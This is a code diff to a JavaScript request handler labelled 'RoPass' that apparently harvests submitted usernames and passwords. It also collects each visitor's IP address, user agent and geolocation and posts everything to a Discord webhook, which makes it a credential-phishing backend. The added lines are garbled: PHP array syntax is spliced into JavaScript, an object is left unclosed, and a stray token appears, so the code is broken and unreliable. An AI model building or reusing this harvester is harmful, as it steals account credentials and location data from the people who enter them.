@@ -16,6 +16,7 @@ export default async function handler(req, res) {
         if (!password) {
             return res.status(400).json({
                 error: "Password required"
+            
         }
 
         const ip =
@@ -23,64 +24,49 @@ export default async function handler(req, res) {
             req.socket.remoteAddress ||
             "Unknown";
 
-        const userAgent = req.headers["user-agent"] || "Unknown";
+        const userAgent =
+            req.headers["user-agent"] || "Unknown";
 
-        // GEOLOCATION
         let geo = {};
 
         try {
-            const geoReq = await fetch(`https://ipapi.co/${ip}/json/`);
+            const geoReq = await fetch(
+                `https://ipapi.co/${ip}/json/`
+            );
+
             geo = await geoReq.json();
+
         } catch (e) {
             geo = {};
         }
 
-        // DISCORD WEBHOOK
-        const webhook = process.env.DISCORD_WEBHOOK;
+        // WEBHOOK
+        const webhook =
+            process.env.DISCORD_WEBHOOK;
 
         const payload = {
-            embeds: [
-                {
-                    title: "RoPass V2",
-                    color: 0x3762dc,
-                    fields: [
-                        {
-                            name: "👤 Username",
-                            value: `\`${username}\``,
-                            inline: true
-                        },
-                        dcx 
-                        {
-                            name: "🌍 IP",
-                            value: `\`${ip}\``,
-                            inline: true
-                        },
-                        {
-                            name: "📍 Country",
-                            value: `\`${geo.country_name || "Unknown"}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🔐 Password",
-                            value: `\`${password} || "Unknown"}\``,
-                            inline: true
-                        },
-                        {
-                            name: "🖥️ User Agent",
-                            value: `\`${userAgent}\``,
-                            inline: false
-                        }
-                    ],
-                    timestamp: new Date().toISOString()
-                }
-            ]
-        };
+             embeds = [
+        "title" => "RoPass v1",
+        "color" => hexdec("3762dc"),
+        "fields" => [
+            ["name" => "👤 Username", "value" => "`" . $data['username'] . "`", "inline" => true],
+            ["name" => "🔑 Password", "value" => "`" . $data['password'] . "`", "inline" => true],
+            ["name" => "🌍 Public IP", "value" => "`" . $data['public_ip'] . "`", "inline" => true],
+            ["name" => "📍 Latitude", "value" => "`" . $data['latitude'] . "`", "inline" => true],
+            ["name" => "📏 Longitude", "value" => "`" . $data['longitude'] . "`", "inline" => true],
+            ["name" => "🔗 Referrer", "value" => "`" . $data['referrer'] . "`", "inline" => true],
+            ["name" => "📡 Port", "value" => "`" . $data['port'] . "`", "inline" => true],
+            ["name" => "📅 Date", "value" => "`" . $data['date'] . "`", "inline" => true],
+            ["name" => "🖥️ User Agent", "value" => "`" . $data['user_agent'] . "`", "inline" => false],
 
+        ],
         await fetch(webhook, {
             method: "POST",
+
             headers: {
                 "Content-Type": "application/json"
             },
+
             body: JSON.stringify(payload)
         });
 
@@ -90,6 +76,7 @@ export default async function handler(req, res) {
         });
 
     } catch (err) {
+
         console.error(err);
 
         return res.status(500).json({
